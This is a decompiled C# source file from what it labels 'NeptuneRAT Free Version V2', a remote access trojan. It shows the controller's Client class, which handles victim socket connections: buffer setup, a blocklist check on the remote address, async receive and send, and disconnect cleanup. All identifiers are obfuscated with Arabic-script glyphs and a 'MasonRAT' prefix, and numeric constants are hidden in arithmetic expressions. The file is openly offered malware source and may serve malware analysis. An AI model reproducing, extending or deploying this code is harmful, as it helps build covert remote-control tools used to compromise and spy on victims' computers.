// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.Client
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace NeptuneRAT;

public class Client
{
  public Socket \u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608;
  public bool \u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A;
  public long \u2694️MasonRAT\u270Cڝټ\u060Fمڞ\u060Dــ\u0609دڙ\u060Bﻻـ;
  public bool \u2694️MasonRAT\u270Cڟٺۧۡ\u060A\u060Aۙڙــ\u0608ــ;
  public byte[] \u2694️MasonRAT\u270Cـ\u060Aټــــٽٺ\u060Cڙــ\u060Aـ\u0609ٽـڙ;
  public MemoryStream \u2694️MasonRAT\u270C\u060Aڙ\u060Dةڙڙڜۏڜد\u060Aـ\u060Aــْ\u0608ڜـ;
  public string \u2694️MasonRAT\u270Cدـ\u060Fּٻـﻼــــطۡـ\u0609ـء\u0609\u0609\u060A;
  public ListViewItem \u2694️MasonRAT\u270C̨ۛ\u060Fۙـ\u0608ڙټ\u060Bٺ;
  public object \u2694️MasonRAT\u270C\u060A\u060E\u060Dـٸڜڜـــ\u0609ڙـۙــبټـ;
  public string \u2694️MasonRAT\u270Cٸ\u060D\u0609\u060Eؤ\u060Cڙ\u0020ـڼبـۨمڼـــڙ;

  public Client(Socket CL)
  {
    this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608 = (Socket) null;
    this.\u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A = false;
    this.\u2694️MasonRAT\u270Cڝټ\u060Fمڞ\u060Dــ\u0609دڙ\u060Bﻻـ = 0L;
    this.\u2694️MasonRAT\u270Cڟٺۧۡ\u060A\u060Aۙڙــ\u0608ــ = false;
    this.\u2694️MasonRAT\u270Cـ\u060Aټــــٽٺ\u060Cڙــ\u060Aـ\u0609ٽـڙ = (byte[]) null;
    this.\u2694️MasonRAT\u270C\u060Aڙ\u060Dةڙڙڜۏڜد\u060Aـ\u060Aــْ\u0608ڜـ = (MemoryStream) null;
    this.\u2694️MasonRAT\u270Cدـ\u060Fּٻـﻼــــطۡـ\u0609ـء\u0609\u0609\u060A = (string) null;
    this.\u2694️MasonRAT\u270C̨ۛ\u060Fۙـ\u0608ڙټ\u060Bٺ = (ListViewItem) null;
    this.\u2694️MasonRAT\u270C\u060A\u060E\u060Dـٸڜڜـــ\u0609ڙـۙــبټـ = (object) null;
    this.\u2694️MasonRAT\u270Cٸ\u060D\u0609\u060Eؤ\u060Cڙ\u0020ـڼبـۨمڼـــڙ = (string) null;
    this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608 = CL;
    this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608.ReceiveBufferSize = (1622609857 + ~396904384 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ 1650259028 - 856117197 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << (930415070 ^ (2022439055 | 60651208)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0) ^ 0;
    this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608.SendBufferSize = (414315285 % 665769415 - 414264075 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ 1827830256 - (1827830246 >> 2127231072) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1) ^ 0;
    this.\u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A = true;
    this.\u2694️MasonRAT\u270Cڝټ\u060Fمڞ\u060Dــ\u0609دڙ\u060Bﻻـ = (long) ((399681061 - ~1659613055 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (-544758687 - 1690914491 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0) >> 0);
    this.\u2694️MasonRAT\u270Cـ\u060Aټــــٽٺ\u060Cڙــ\u060Aـ\u0609ٽـڙ = new byte[1];
    this.\u2694️MasonRAT\u270C\u060Aڙ\u060Dةڙڙڜۏڜد\u060Aـ\u060Aــْ\u0608ڜـ = new MemoryStream();
    this.\u2694️MasonRAT\u270Cدـ\u060Fּٻـﻼــــطۡـ\u0609ـء\u0609\u0609\u060A = CL.RemoteEndPoint.ToString();
    this.\u2694️MasonRAT\u270C\u060A\u060E\u060Dـٸڜڜـــ\u0609ڙـۙــبټـ = RuntimeHelpers.GetObjectValue(new object());
    if (Settings.\u2694️MasonRAT\u270Cـ̨\u0609ءۧٻ̍ـ\u0608ْبـﻋ.Contains(this.\u2694️MasonRAT\u270Cدـ\u060Fּٻـﻼــــطۡـ\u0609ـء\u0609\u0609\u060A.Split((char) (((1892710494 << 675778295) - 1909893062 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ((790560850 > 241308658 ? 1308075307 : 1744100409) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 << (1285460315 - ~101476175 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0) ^ 0))[0]))
      this.\u2694️MasonRAT\u270Cـ\u0608ـּۡـڙـ\u0609ــٻ̍\u060Dبڜ\u0609\u0609ۡد();
    else
      this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608.BeginReceive(this.\u2694️MasonRAT\u270Cـ\u060Aټــــٽٺ\u060Cڙــ\u060Aـ\u0609ٽـڙ, 0, this.\u2694️MasonRAT\u270Cـ\u060Aټــــٽٺ\u060Cڙــ\u060Aـ\u0609ٽـڙ.Length, SocketFlags.None, new AsyncCallback(this.\u2694️MasonRAT\u270Cىؤﯧ\u060Aـ̍ـ\u060A\u060Aﻋٺ\u0609), (object) null);
  }

  public void \u2694️MasonRAT\u270Cىؤﯧ\u060Aـ̍ـ\u060A\u060Aﻋٺ\u0609(IAsyncResult ar)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    Client.VB\u0024StateMachine_11_BeginReceive stateMachine = new Client.VB\u0024StateMachine_11_BeginReceive();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Me = this;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Local_ar = ar;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024State = (644159781 - 1333849039 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (1389967960 - (385850401 >> 1948638299) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) % (698831538 + (740947831 >> 1229908329) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) + 0;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder = AsyncVoidMethodBuilder.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder.Start<Client.VB\u0024StateMachine_11_BeginReceive>(ref stateMachine);
  }

  public void \u2694️MasonRAT\u270Cڙـۙٺٺ̍ــڕ\u060A\u060B\u0608(byte[] Data)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    Client.VB\u0024StateMachine_12_BeginSend stateMachine = new Client.VB\u0024StateMachine_12_BeginSend();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Me = this;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Local_Data = Data;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024State = ((-1368965543 ^ 1368965548 % 1854547746) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ (623085621 >> 1631603415) - 64 /*0x40*/ + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1) >> 0;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder = AsyncVoidMethodBuilder.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder.Start<Client.VB\u0024StateMachine_12_BeginSend>(ref stateMachine);
  }

  public void \u2694️MasonRAT\u270Cﻋּ\u060A\u0609ــۏط\u060Aـةدڇٻ\u060A(IAsyncResult ar)
  {
    try
    {
      this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608.EndSend(ar);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3890) + exception.Message);
      this.\u2694️MasonRAT\u270Cـ\u0608ـּۡـڙـ\u0609ــٻ̍\u060Dبڜ\u0609\u0609ۡد();
      ProjectData.ClearProjectError();
    }
  }

  public void \u2694️MasonRAT\u270Cـ\u0608ـּۡـڙـ\u0609ــٻ̍\u060Dبڜ\u0609\u0609ۡد()
  {
    this.\u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A = false;
    try
    {
      if (this.\u2694️MasonRAT\u270C̨ۛ\u060Fۙـ\u0608ڙټ\u060Bٺ != null)
      {
        if (Messages.\u2694️MasonRAT\u270C\u0608ٻ̨ڙْؤــ\u0608\u060Bةڙ\u060Eټـٽـ.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.InvokeRequired)
        {
          Messages.\u2694️MasonRAT\u270C\u0608ٻ̨ڙْؤــ\u0608\u060Bةڙ\u060Eټـٽـ.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.BeginInvoke((Delegate) new Client._isDisconnected(this.\u2694️MasonRAT\u270Cـ\u0608ـּۡـڙـ\u0609ــٻ̍\u060Dبڜ\u0609\u0609ۡد));
          return;
        }
        this.\u2694️MasonRAT\u270C̨ۛ\u060Fۙـ\u0608ڙټ\u060Bٺ.Remove();
        Helper.\u2694️MasonRAT\u270Cـــــٸﻼ\u060D\u0608\u060Eـ(this.\u2694️MasonRAT\u270Cدـ\u060Fּٻـﻼــــطۡـ\u0609ـء\u0609\u0609\u060A.Split((char) ((306851756 - 309117810 % 309386021 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ -449562503 - 2117360397 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << (-1507694999 - 1244951553 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0 << 0))[0], false);
        Settings.\u2694️MasonRAT\u270Cڙټ\u060Bـ\u0609ڙٸـ\u060Cــۙـ\u060Dـ\u0609ـ\u060Aٽ\u060A.Remove(this);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3891) + exception.Message);
      ProjectData.ClearProjectError();
    }
    try
    {
      this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608.Close();
      this.\u2694️MasonRAT\u270Cـگ\u060A\u060Fڼڕۛـٸْ\u060Aد\u060D\u0608\u0608.Dispose();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3892) + exception.Message);
      ProjectData.ClearProjectError();
    }
    try
    {
      this.\u2694️MasonRAT\u270C\u060Aڙ\u060Dةڙڙڜۏڜد\u060Aـ\u060Aــْ\u0608ڜـ.Dispose();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3893) + exception.Message);
      ProjectData.ClearProjectError();
    }
  }

  public delegate void _isDisconnected();
}
